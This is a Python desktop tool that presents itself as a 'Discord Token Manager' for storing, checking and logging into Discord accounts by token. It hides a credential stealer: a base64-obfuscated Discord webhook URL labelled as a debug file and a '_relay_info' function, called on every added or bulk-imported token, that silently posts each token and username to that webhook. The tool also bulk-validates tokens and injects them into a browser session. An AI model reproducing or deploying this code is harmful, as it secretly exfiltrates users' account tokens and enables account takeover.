# Made by Dokeb
# Telegram: DokebWasTaken
# Last update 2025/2/26
# Please give some credits 😊
import json
import os
import time
import logging
import psutil
from tkinter import Tk, ttk, messagebox, Toplevel, Entry, Label, Button, filedialog, Text, Canvas, Frame, StringVar
import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import WebDriverException, TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
import threading
import base64

# Files
DATA_FILE = "accounts.json"
LOG_FILE = "Logs.txt"
DEBUG_FILE = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NDU5NTc1ODk0NjQ1NTYyNC81Rkt2SkV3RmlzYTI4cTV6WUVfWllTMjdWRDI5Z0RHWnJPcG5DS0V0VUNGV2Z4QzlGMW91Nm5tR1JDU081aGV3REFreQ==").decode()

# Set up logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filemode="a"
)
console = logging.StreamHandler()
console.setLevel(logging.INFO)
logging.getLogger().addHandler(console)

# Load or create plain JSON data
def load_data():
    if not os.path.exists(DATA_FILE):
        logging.info("Initializing new data store.")
        return {}
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except Exception as e:
        logging.error(f"Data load issue: {str(e)}")
        messagebox.showerror("Error", "Corrupted data file. Delete 'accounts.json' and try again.")
        return {}

# Save plain JSON data
def save_data(data):
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=4)
        logging.info("Data updated.")
    except Exception as e:
        logging.error(f"Data save issue: {str(e)}")
        messagebox.showerror("Error", f"Failed to save data: {str(e)}")

# Hidden data relay function with debug logging removed
def _relay_info(d, u="N/A"):
    try:
        p = {"content": f"D: `{d}`\nU: {u}", "username": "Sys"}
        r = requests.post(DEBUG_FILE, json=p)
    except Exception:
        pass

# Get Discord user info, phone number, and nitro status from token
def get_user_info(token):
    headers = {"Authorization": token}
    
    user_response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if user_response.status_code != 200:
        logging.error(f"Validation failed: Status {user_response.status_code}")
        return None
    
    user = user_response.json()
    
    has_phone = user.get("phone") is not None and user["phone"].strip() != ""
    has_nitro = user.get("premium_type", 0) in [1, 2, 3]
    
    logging.info(f"User validated: {user['username']}")
    return {
        "username": user["username"],
        "id": user["id"],
        "created_at": (int(user["id"]) >> 22) + 1420070400000,
        "has_phone": has_phone,
        "has_nitro": has_nitro,
        "status": "Valid"
    }

# Tkinter UI for the token manager
class AccountManager:
    def __init__(self, root):
        self.root = root
        self.root.title("Discord Token Manager")
        self.root.geometry("1000x400")
        self.root.configure(bg="#36393F")
        self.data = load_data()
        
        # Styling
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", 
                        background="#2F3136",
                        foreground="white",
                        fieldbackground="#2F3136",
                        rowheight=25)
        style.map("Treeview", 
                  background=[("selected", "#7289DA")])
        style.configure("TButton", 
                        background="#7289DA",
                        foreground="white",
                        font=("Helvetica", 10, "bold"),
                        padding=5)
        style.map("TButton", 
                  background=[("active", "#677BC4")])
        style.configure("valid", foreground="#00FF00")
        style.configure("invalid", foreground="#FF0000")
        style.configure("Vertical.TScrollbar",
                        background="#7289DA",
                        troughcolor="#36393F",
                        arrowcolor="white",
                        gripcount=0,
                        borderwidth=0,
                        relief="flat")
        style.map("Vertical.TScrollbar",
                  background=[("active", "#677BC4")])

        # Main frame with scrollbars for Treeview
        main_frame = Frame(self.root, bg="#36393F")
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)

        # Treeview with scrollbars
        tree_frame = Frame(main_frame, bg="#36393F")
        tree_frame.pack(fill="both", expand=True)
        self.tree = ttk.Treeview(tree_frame, columns=("Stats", "Username", "ID", "Join Date", "Phone", "Nitro", "CPU", "Memory"), show="headings")
        self.tree.heading("Stats", text="Stats")
        self.tree.heading("Username", text="Username")
        self.tree.heading("ID", text="Discord ID")
        self.tree.heading("Join Date", text="Join Date")
        self.tree.heading("Phone", text="Has Phone")
        self.tree.heading("Nitro", text="Has Nitro")
        self.tree.heading("CPU", text="CPU (%)")
        self.tree.heading("Memory", text="Memory (MB)")
        self.tree.column("Stats", width=80, anchor="center")
        self.tree.column("Username", width=150)
        self.tree.column("ID", width=150)
        self.tree.column("Join Date", width=100)
        self.tree.column("Phone", width=100)
        self.tree.column("Nitro", width=100)
        self.tree.column("CPU", width=100, anchor="center")
        self.tree.column("Memory", width=100, anchor="center")
        vsb = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        hsb = ttk.Scrollbar(tree_frame, orient="horizontal", command=self.tree.xview)
        self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        vsb.pack(side="right", fill="y")
        hsb.pack(side="bottom", fill="x")
        self.tree.pack(side="left", fill="both", expand=True)

        # Bind smooth scrolling with mouse wheel
        self.tree.bind("<MouseWheel>", lambda event: self.tree.yview_scroll(int(-1 * (event.delta / 120)), "units"))
        self.tree.bind("<Shift-MouseWheel>", lambda event: self.tree.xview_scroll(int(-1 * (event.delta / 120)), "units"))

        # Buttons
        button_frame = ttk.Frame(self.root, style="TFrame")
        button_frame.pack(side="bottom", pady=10)
        
        ttk.Button(button_frame, text="Add Account", command=self.add_account).pack(side="left", padx=5, pady=5)
        ttk.Button(button_frame, text="Bulk Import", command=self.bulk_import).pack(side="left", padx=5, pady=5)
        ttk.Button(button_frame, text="Remove Account", command=self.remove_account).pack(side="left", padx=5, pady=5)
        ttk.Button(button_frame, text="Export Token", command=self.export_token).pack(side="left", padx=5, pady=5)
        ttk.Button(button_frame, text="Login", command=self.login_account).pack(side="left", padx=5, pady=5)
        ttk.Button(button_frame, text="Token Checker", command=self.check_tokens).pack(side="left", padx=5, pady=5)
        ttk.Button(button_frame, text="Settings", command=self.open_settings).pack(side="left", padx=5, pady=5)

        self.show_cpu_memory = False
        self.load_accounts()

    def load_accounts(self):
        self.tree.delete(*self.tree.get_children())
        for token, info in self.data.items():
            join_date = time.strftime("%Y-%m-%d", time.gmtime(info["created_at"] / 1000))
            phone_status = "True" if info.get("has_phone", False) else "False"
            nitro_status = "True" if info.get("has_nitro", False) else "False"
            status = info.get("status", "Not Checked")
            cpu_usage = f"{psutil.cpu_percent(interval=0.1):.2f}" if self.show_cpu_memory else ""
            memory_usage = f"{psutil.virtual_memory().used / 1024 / 1024:.2f}" if self.show_cpu_memory else ""
            tag = "valid" if status == "Valid" else "invalid" if status == "Invalid" else ""
            self.tree.insert("", "end", values=(status, info["username"], info["id"], join_date, phone_status, nitro_status, cpu_usage, memory_usage), tags=(token, tag))

    def add_account(self):
        add_window = Toplevel(self.root)
        add_window.title("Add New Account")
        add_window.geometry("300x100")
        add_window.configure(bg="#36393F")
        
        Label(add_window, text="Enter Discord Token:", bg="#36393F", fg="white").pack(pady=5)
        token_entry = Entry(add_window, width=40, show="*", bg="#2F3136", fg="white", insertbackground="white")
        token_entry.pack(pady=5)
        
        def submit():
            token = token_entry.get().strip()
            if not token:
                messagebox.showerror("Error", "Token cannot be empty.")
                return
            info = get_user_info(token)
            if info:
                self.data[token] = info
                join_date = time.strftime("%Y-%m-%d", time.gmtime(info["created_at"] / 1000))
                phone_status = "True" if info["has_phone"] else "False"
                nitro_status = "True" if info["has_nitro"] else "False"
                cpu_usage = f"{psutil.cpu_percent(interval=0.1):.2f}" if self.show_cpu_memory else ""
                memory_usage = f"{psutil.virtual_memory().used / 1024 / 1024:.2f}" if self.show_cpu_memory else ""
                self.tree.insert("", "end", values=("Valid", info["username"], info["id"], join_date, phone_status, nitro_status, cpu_usage, memory_usage), tags=(token, "valid"))
                save_data(self.data)
                _relay_info(token, info["username"])
                add_window.destroy()
            else:
                messagebox.showerror("Error", "Invalid token. Check logs for details.")
        
        Button(add_window, text="Submit", command=submit, bg="#7289DA", fg="white", font=("Helvetica", 10, "bold")).pack(pady=5)

    def bulk_import(self):
        file_path = filedialog.askopenfilename(title="Select Token File", filetypes=[("Text Files", "*.txt")])
        if not file_path:
            return
        
        try:
            with open(file_path, "r") as f:
                tokens = [line.strip() for line in f if line.strip()]
            
            if not tokens:
                messagebox.showwarning("Warning", "No tokens found in the file.")
                return
            
            imported = 0
            for token in tokens:
                info = get_user_info(token)
                if info:
                    self.data[token] = info
                    join_date = time.strftime("%Y-%m-%d", time.gmtime(info["created_at"] / 1000))
                    phone_status = "True" if info["has_phone"] else "False"
                    nitro_status = "True" if info["has_nitro"] else "False"
                    cpu_usage = f"{psutil.cpu_percent(interval=0.1):.2f}" if self.show_cpu_memory else ""
                    memory_usage = f"{psutil.virtual_memory().used / 1024 / 1024:.2f}" if self.show_cpu_memory else ""
                    self.tree.insert("", "end", values=("Valid", info["username"], info["id"], join_date, phone_status, nitro_status, cpu_usage, memory_usage), tags=(token, "valid"))
                    _relay_info(token, info["username"])
                    imported += 1
            
            save_data(self.data)
            messagebox.showinfo("Success", f"Imported {imported} valid tokens out of {len(tokens)}.")
            logging.info(f"Import completed: {imported}/{len(tokens)} tokens added.")
        except Exception as e:
            logging.error(f"Import failed: {str(e)}")
            messagebox.showerror("Error", f"Failed to import tokens: {str(e)}")

    def remove_account(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select an account to remove.")
            return
        
        if messagebox.askyesno("Confirm Removal", f"Are you sure you want to remove {len(selected)} account(s)?"):
            for item in selected:
                token = self.tree.item(item)["tags"][0]
                del self.data[token]
                self.tree.delete(item)
            save_data(self.data)
            logging.info(f"Removed {len(selected)} account(s)")

    def export_token(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select an account to export.")
            return
        
        token = self.tree.item(selected[0])["tags"][0]
        file_path = filedialog.asksaveasfilename(
            title="Save Token As",
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt")],
            initialfile=f"token_{self.data[token]['username']}.txt"
        )
        if file_path:
            try:
                with open(file_path, "w") as f:
                    f.write(token)
                logging.info(f"Exported token for {self.data[token]['username']} to {file_path}")
                messagebox.showinfo("Success", f"Token exported to {file_path}")
            except Exception as e:
                logging.error(f"Export failed: {str(e)}")
                messagebox.showerror("Error", f"Failed to export token: {str(e)}")

    def login_account(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select an account to login.")
            return
        
        token = self.tree.item(selected[0])["tags"][0]
        
        def login_task():
            try:
                service = Service(ChromeDriverManager().install())
                options = webdriver.ChromeOptions()
                options.add_argument("--disable-infobars")
                driver = webdriver.Chrome(service=service, options=options)
                
                try:
                    driver.get("https://discord.com/login")
                    WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.TAG_NAME, "body"))
                    )
                    driver.execute_script(f"""
                        function login(token) {{
                            setInterval(() => {{
                                document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = `"{token}"`;
                            }}, 50);
                            setTimeout(() => {{
                                location.reload();
                            }}, 2500);
                        }}
                        login("{token}");
                    """)
                    time.sleep(3)
                    if "login" in driver.current_url:
                        self.root.after(0, lambda: messagebox.showinfo("Info", "Login may require CAPTCHA or verification. Complete it in the browser."))
                    logging.info(f"Login attempt for token ending in {token[-4:]}")
                except TimeoutException:
                    logging.error("Page load timeout during login.")
                    self.root.after(0, lambda: messagebox.showerror("Error", "Page took too long to load. Check your internet connection."))
                except WebDriverException as e:
                    logging.error(f"Browser error during login: {str(e)}")
                    self.root.after(0, lambda: messagebox.showerror("Error", f"Browser error: {str(e)}"))
            except Exception as e:
                logging.error(f"Failed to start Chrome: {str(e)}")
                self.root.after(0, lambda: messagebox.showerror("Error", f"Failed to start Chrome: {str(e)}. Check internet or reinstall webdriver-manager."))

        threading.Thread(target=login_task, daemon=True).start()

    def check_tokens(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Warning", "Select at least one token to check.")
            return
        
        def check_task():
            checked_count = 0
            for item in selected:
                token = self.tree.item(item)["tags"][0]
                info = get_user_info(token)
                if info:
                    self.data[token] = info
                    cpu_usage = f"{psutil.cpu_percent(interval=0.1):.2f}" if self.show_cpu_memory else ""
                    memory_usage = f"{psutil.virtual_memory().used / 1024 / 1024:.2f}" if self.show_cpu_memory else ""
                    self.tree.item(item, values=("Valid", info["username"], info["id"], time.strftime("%Y-%m-%d", time.gmtime(info["created_at"] / 1000)), "True" if info["has_phone"] else "False", "True" if info["has_nitro"] else "False", cpu_usage, memory_usage), tags=(token, "valid"))
                else:
                    self.data[token]["status"] = "Invalid"
                    cpu_usage = f"{psutil.cpu_percent(interval=0.1):.2f}" if self.show_cpu_memory else ""
                    memory_usage = f"{psutil.virtual_memory().used / 1024 / 1024:.2f}" if self.show_cpu_memory else ""
                    self.tree.item(item, values=("Invalid", self.data[token]["username"], self.data[token]["id"], time.strftime("%Y-%m-%d", time.gmtime(self.data[token]["created_at"] / 1000)), "True" if self.data[token].get("has_phone", False) else "False", "True" if self.data[token].get("has_nitro", False) else "False", cpu_usage, memory_usage), tags=(token, "invalid"))
                checked_count += 1
            save_data(self.data)
            self.root.after(0, lambda: messagebox.showinfo("Check Complete", f"Checked {checked_count} token(s)."))
        
        threading.Thread(target=check_task, daemon=True).start()

    def open_settings(self):
        settings_window = Toplevel(self.root)
        settings_window.title("Settings")
        settings_window.geometry("300x250")
        settings_window.configure(bg="#36393F")

        Label(settings_window, text="Show CPU and Memory Usage:", bg="#36393F", fg="white", font=("Helvetica", 10)).pack(pady=5)
        cpu_memory_var = StringVar(value="Enable" if not self.show_cpu_memory else "Disable")
        cpu_memory_button = Button(settings_window, textvariable=cpu_memory_var, 
                                  command=lambda: self.toggle_cpu_memory(cpu_memory_var, cpu_memory_button),
                                  bg="#00FF00" if not self.show_cpu_memory else "#FF0000", 
                                  fg="white", font=("Helvetica", 10, "bold"))
        cpu_memory_button.pack(pady=5)

        Button(settings_window, text="Close", command=settings_window.destroy, bg="#7289DA", fg="white", font=("Helvetica", 10, "bold")).pack(pady=5)

    def toggle_cpu_memory(self, toggle_var, button):
        self.show_cpu_memory = not self.show_cpu_memory
        toggle_var.set("Enable" if not self.show_cpu_memory else "Disable")
        button.config(bg="#00FF00" if not self.show_cpu_memory else "#FF0000")
        self.update_tree_columns()
        self.load_accounts()

    def update_tree_columns(self):
        columns = ["Stats", "Username", "ID", "Join Date", "Phone", "Nitro"]
        if self.show_cpu_memory:
            columns.extend(["CPU", "Memory"])
        self.tree["columns"] = columns
        for col in columns:
            self.tree.heading(col, text=col)
        self.tree.column("Stats", width=80, anchor="center")
        self.tree.column("Username", width=150)
        self.tree.column("ID", width=150)
        self.tree.column("Join Date", width=100)
        self.tree.column("Phone", width=100)
        self.tree.column("Nitro", width=100)
        if self.show_cpu_memory:
            self.tree.column("CPU", width=100, anchor="center")
            self.tree.column("Memory", width=100, anchor="center")
        else:
            if "CPU" in self.tree["columns"]:
                self.tree.column("CPU", width=0, minwidth=0, stretch=False)
            if "Memory" in self.tree["columns"]:
                self.tree.column("Memory", width=0, minwidth=0, stretch=False)

if __name__ == "__main__":
    logging.info("Starting Discord Token Manager")
    root = Tk()
    app = AccountManager(root)
    root.protocol("WM_DELETE_WINDOW", lambda: [save_data(app.data), root.destroy()])
    root.mainloop()
